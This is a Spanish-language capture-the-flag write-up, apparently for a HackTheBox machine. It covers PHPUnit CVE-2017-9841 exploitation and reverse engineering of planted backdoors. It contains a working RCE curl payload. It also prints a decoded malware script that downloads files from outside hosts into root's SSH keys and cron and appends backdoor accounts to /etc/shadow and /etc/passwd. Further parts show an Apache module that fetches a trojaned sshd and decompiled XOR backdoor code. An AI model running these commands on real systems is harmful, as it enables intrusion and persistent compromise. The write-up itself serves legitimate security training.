-------
- Tags: #reversing #ghidra #vhost #PHPUnit #password-crack #backdoor 
---------
## Técnicas utilizadas
- Virtual Hosting Enumeration  
- Abusing Directory Listing  
- PHPUnit 5.6 Exploitation (CVE-2017-9841) [RCE]  
- Backup Inspection  
- Binary Analysis - GHIDRA  
- Cracking Hashes  
- Apache Backdoor Analysis [Privilege Escalation]
## Procedimiento

![[Pasted image 20230828154049.png]]

#### Reconocimiento
Si lanzamos un **nmap** podemos ver los siguientes puertos abiertos, con sus servicios y sus respectivas versiones:
```ruby
# nmap -sCV -p80,22 10.10.11.146 -oN Ports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 15:40 PDT
Nmap scan report for 10.10.11.146
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Diana's Jewelry

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
```

Un escaneo con **whatweb** sobre las tecnologías web nos muestra lo siguiente:
```ruby
# whatweb 10.10.11.146
http://10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana's Jewelry]
```

--------------
#### Virtual Hosting Enumeration  
En la pagina principal, no encontramos nada interesante. Sin embargo, hay un enlace que nos lleva a una tienda, pero, apunta a un subdominio el cual no tenemos contemplado en el **/etc/hosts**:
![[Pasted image 20230828154449.png]]

Si lo contenplamos y volvamos a visitar la pagina, podemos ver una pagina basica de compra y venta de joyeria:
![[Pasted image 20230828154626.png]]

---------
#### Abusing Directory Listing  
A simple vista no encontramos nada de valor de lo cual pudieramos aprovecharnos. Un escaneo con **Gobuster** nos muestra los siguientes resultados, los cuales, de primera, quizás haga pensar que no hay nada de utilidad:
![[Pasted image 20230828154821.png]]

Pero, algo que podriamos intentar hacer, es buscar plugins o herramientas que esten en el sitio web a través del directorio de **Vendor**. Si visitamos el directorio, vemos que tenemos capacidad de directory listing:
![[Pasted image 20230828155017.png]]

Dentro de la carpeta **Composer** encontramos un **installed.json** el cual contiene alguno de los plugins instalados en el proyecto. Para mayor comodidad, podemos hacerle un **Curl** y pipearlo con **Jq** para verlo en un formato más bonito y con colores:
```json
curl -s -X GET "http://store.djewelry.htb/vendor/composer/installed.json" | jq '.[] | {name, version}'
{
  "name": "doctrine/instantiator",
  "version": "1.4.0"
}
{
  "name": "myclabs/deep-copy",
  "version": "1.10.2"
}
{
  "name": "phpdocumentor/reflection-common",
  "version": "2.2.0"
}
{
  "name": "phpdocumentor/reflection-docblock",
  "version": "5.2.2"
}
{
  "name": "phpdocumentor/type-resolver",
  "version": "1.4.0"
}
{
  "name": "phpspec/prophecy",
  "version": "v1.10.3"
}
{
  "name": "phpunit/php-code-coverage",
  "version": "4.0.8"
}
{
  "name": "phpunit/php-file-iterator",
  "version": "1.4.5"
}
{
  "name": "phpunit/php-text-template",
  "version": "1.2.1"
}
{
  "name": "phpunit/php-timer",
  "version": "1.0.9"
}
{
  "name": "phpunit/php-token-stream",
  "version": "2.0.2"
}
{
  "name": "phpunit/phpunit",
  "version": "5.6.2"
}
{
  "name": "phpunit/phpunit-mock-objects",
  "version": "3.4.4"
}
{
  "name": "sebastian/code-unit-reverse-lookup",
  "version": "1.0.2"
}
{
  "name": "sebastian/comparator",
  "version": "1.2.4"
}
{
  "name": "sebastian/diff",
  "version": "1.4.3"
}
{
  "name": "sebastian/environment",
  "version": "2.0.0"
}
{
  "name": "sebastian/exporter",
  "version": "1.2.2"
}
{
  "name": "sebastian/global-state",
  "version": "1.1.1"
}
{
  "name": "sebastian/object-enumerator",
  "version": "1.0.0"
}
{
  "name": "sebastian/recursion-context",
  "version": "1.0.5"
}
{
  "name": "sebastian/resource-operations",
  "version": "1.0.0"
}
{
  "name": "sebastian/version",
  "version": "2.0.1"
}
{
  "name": "symfony/polyfill-ctype",
  "version": "v1.23.0"
}
{
  "name": "symfony/yaml",
  "version": "v3.4.47"
}
{
  "name": "webmozart/assert",
  "version": "1.10.0"
}
```

#### PHPUnit 5.6 Exploitation (CVE-2017-9841) [RCE]  
Si buscamos por vulnerabilidad por cada uno de los plugins, encontramos una para el plugin de **phpunit/phpunit** de tipo **Remote Code Execution** el cual nos dice que debemos de mandar una data en tipo **PHP** a la siguiente dirección:
```ruby
# curl -s -X GET "http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" -d '<?php system("whoami"); ?>'
www-data
```

Y ya tendriamos la ejecución remota de comandos. Ahora, podriamos mandar una data en base64 para ejecutar una reverse shell y pipearla con **base64 -d** y luego con **bash**:
![[Pasted image 20230828155920.png]]

--------------
#### Backup Inspection  
Una vez en la maquina vamos a filtrar por archivos que pertecezca a **www-data** (es nuestro usuario, acualmente). Encontramos uno en particular que nos llama  la atención de nombre **Info**:
![[Pasted image 20230828160435.png]]

Al hacerle un **File** observamos que es un binario compilado para **Unix**:
```ruby
# find / -group www-data 2>/dev/null | grep -vE "procail -n 1 | xargs file  
/var/backups/info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
```

Al estar en el directorio **BackUp** puede darnos una pista de que quizás haya información privilegiada que podamos aprovechar.

#### Binary Analysis - GHIDRA  
Descargamos el archivo para posteriormente inspeccionarlo con **Ghidra**. Al hacerle un **Strings** al binario, podemos observar algo peculiar que llama la atención:
![[Pasted image 20230828162324.png]]

Se trata de una cadena en **Hexadecimal** la cual, al hacer el proceso inverso, vemos las siguientes lineas de codigo:
```bash
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys;
wget tempfiles.xyz/.main -O /var/lib/.main;
chmod 755 /var/lib/.main;
echo "* 3 * * * root /var/lib/.main" >> /etc/crontab;
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd;
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd;
while read -r user group home shell _;
do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt;
rm users.txt;
```

Vemos algunos comandos ejecutados a nivel de sistema, pero lo curioso aqui, es que vemos una contraseña hasheada la cual, podemos intentar romper por fuerza bruta de manera **Offline**.

--------
#### Cracking Hashes  
Con el hash en nuestra disposición, podemos intentar romperlo con herramientas como **HashCat** o **John**, cabe menciona que primero tenemos que acomadar el hash de manera que estas herramientas puedan interpretarlo de manera correcto. El formato idoneo es el siguiente:
```
$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
```

Al final, tenemos la siguiente contraseña:
```ruby
ihatehackers
```

Esta nos sirve para conectarnos como **Steven1**.

#### Apache Backdoor Analysis [Privilege Escalation]
Una vez como **Steven** encontramos que tenemos un correo en nuestra bandeja de entrada que contiene lo siguiente:
```
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
	for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

Basicamente nos esta diciendo que apache ultimamente ha tenido un comportamiento extraño. Podemos filtrar por archivos desde que se creo el correo. hasta despues de 2 días para intentar dar con algo interesante:
```
find / -type f -newermt 2021-05-10 ! -newermt 2021-05-21 -ls 2>/dev/null
[...]
 50834      4 -rw-r--r--   1 root     root           69 May 17  2021 /etc/apache2/mods-available/reader.load
[...]
```

Al hacerle un **Cat** vemos que carga un modulo de la siguiente dirección:
```
LoadModule reader_module      /usr/lib/apache2/modules/mod_reader.so
```

Este archivo, podemos pasarlo a nuestra maquina para echarle un ojo también con **Ghidra**. Vemos que hay una funcion de nombre **hook_post_config** la cual hace un decode de la siguiente linea:
```
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk==
```
Al hacer el proceso inverso, vemos el siguiente comando:
```
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d
```

Esto nos da una pista, ahora nos queda inspeccionar el **SSHD** en busca de algo interesante. Dentro, encontramos una funcion que tiene algunas variables de nombre **Backdoor** luego, les aplica un **Xor** para posteriormente hacer un **Strcmp** (compara los valores):
```c
  backdoor[28] = -0xc;
  backdoor[29] = -0x57;
  ppVar1 = ctxt->pw;
  iVar9 = ctxt->valid;
  backdoor[24] = -0x1d;
  backdoor[25] = -0x4b;
  backdoor[26] = -0x10;
  backdoor[27] = -0x44;
  backdoor[16] = -0x2a;
  backdoor[17] = -0x4d;
  backdoor[18] = -0x60;
  backdoor[19] = -3;
  backdoor[20] = -0x60;
  backdoor[21] = -0xc;
  backdoor[22] = -0x2a;
  backdoor[23] = -0x4e;
  backdoor[30] = -0x5b;
  backdoor[0] = -0x2a;
  backdoor[1] = -0x55;
  backdoor[2] = -0x19;
  backdoor[3] = -0x10;
  backdoor[4] = -0xd;
  backdoor[5] = -0x5d;
  backdoor[6] = -0x4d;
  backdoor[7] = -0x5c;
  backdoor[8] = -0x38;
  backdoor[9] = -3;
  backdoor[10] = -0x45;
  backdoor[11] = -9;
  backdoor[12] = -0x19;
  backdoor[13] = -0x2a;
  backdoor[14] = -0x4d;
  backdoor[15] = -3;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
```

Podemos copiar los recpectivos valores, ponelos en Little Endian, pasarlos a Hexadecimal y aplicarlos un **XOR** contra **96** y obtendriamos la contraseña de **Root**:
![[Pasted image 20230828171847.png]]

